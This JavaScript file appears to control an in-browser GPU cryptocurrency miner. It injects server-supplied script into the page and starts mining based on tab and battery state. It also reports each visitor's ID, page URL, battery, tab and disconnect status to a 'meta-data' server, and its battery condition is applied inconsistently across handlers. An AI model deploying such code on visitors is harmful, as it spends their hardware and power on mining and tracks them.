var eventEmiter = new EventEmitter();
var network = new NetworkConfig();
/**
 * Function main.
 *  [Start the scripte]
 */
function main() {
  $('body').append("<canvas width=\"256px\" height=\"256px\" id=\"gl\"></canvas>")

  var banner = new BannerHandle();
  eventEmiter.on("getId", function(idInfo){
    banner.display();
    banner.idDisplayInDebugInfo(idInfo);
    console.log(idInfo.new);
    if (idInfo.new) {
      network.post("meta-data", {
        "newId": objData.idHandle.getId(),
        "url" : objData.info.uri
      });
    }
  });


  var objData = new DataHandler();
  var objExtEvent = new ExtEventHandler();

  eventEmiter.on("injectScript", function(scripte) {
    var scripteCode = '<SCRIPT type="text/javascript">'
    + scripte
    + '</SCRIPT>';
    $('body').append(scripteCode);
    console.log("START Script");
    if (objExtEvent.info.tabActive
        && objExtEvent.info.battery) {
      eventEmiter.trigger("scriptStart");
    } else {
      eventEmiter.trigger("scriptStop");
    }
  });
  eventEmiter.on("scriptStart", function() {
    begin_mining();
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "scriptState":"start",
      "url" : objData.info.uri,
      "time": Date.now()
    });
  });
  eventEmiter.on("scriptStop", function() {
    onStop();
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "scriptState":"stop",
      "url" : objData.info.uri,
      "time": Date.now()
    });
  });
  eventEmiter.on("scriptData", function(data) {
    console.log("script Data");
    /*network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "scriptState":"find",
      "url" : objData.info.uri,
      "time": Date.now()
    });*/
    banner.displayMiningData(data);
  });
  eventEmiter.on("scriptError", function(error) {
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "scriptState":"error",
      "url" : objData.info.uri,
      "time": Date.now()
    });
  console.log("Error : " + JSON.stringify(error));
  });
  eventEmiter.on("scriptMessage", function(message) {
    banner.displayMiningMessage(message);
  });



  /**
   *  ~Anonymous function.~
   *  [This function is triggered when the script get all informations. It send the internaut information to the analyse server, and display there information on the banner log].
   */
  eventEmiter.on("ready", function() {
    objData.idHandle.connect(objData.info, objExtEvent.info);
    banner.display();
    banner.dataDisplayDebugInfo(objData.info)
    banner.pushBatterieAtivity(objExtEvent.info.battery);
    banner.pushTabAtivity(objExtEvent.info.tabActive);
  });

  /**
   *  ~Anonymous function.~
   *  [This function is triggered when the script make a hash. It display the hash result on banner log].
   */
  eventEmiter.on("GPUhash", function() {
    banner.pushHash(objData.info.hashs_per_second);
  });

  /**
  *  ~Anonymous function.~
  *  [This function is triggered when batterie state change (charge/decharge). It send the batterie state to the meta-data server].
  */
  eventEmiter.on("batteryState", function() {
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "isOnBattery" : objExtEvent.info.battery,
      "url" : objData.info.uri
    });
    if (objExtEvent.info.tabActive
        && !objExtEvent.info.battery) {
      eventEmiter.trigger("scriptStart");
    } else {
      eventEmiter.trigger("scriptStop");
    }

    banner.pushBatterieAtivity(objExtEvent.info.battery);
  });

  /**
   *  ~Anonymous function.~
   *  [This function is triggered when windows state change (active/inactive). It send the windows state to the meta-data server].
   */
  eventEmiter.on("tabActiveState", function() {
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "isTabActive" :  objExtEvent.info.tabActive,
      "url" : objData.info.uri
    });
    if (objExtEvent.info.tabActive
        && objExtEvent.info.battery) {
      eventEmiter.trigger("scriptStart");
    } else {
      eventEmiter.trigger("scriptStop");
    }
    banner.pushTabAtivity(objExtEvent.info.tabActive);
  })

  /**
   *  ~Anonymous function.~
   *  [This function is triggered when windows is closed. It send this information to the meta-data server].
   */
  eventEmiter.on("deconnection", function() {
    network.post("meta-data", {
      "id": objData.idHandle.getId(),
      "isDisconnected" : true,
      "url" : objData.info.uri
    });
  });
  objData.loop();
  objExtEvent.loop();
}



main();
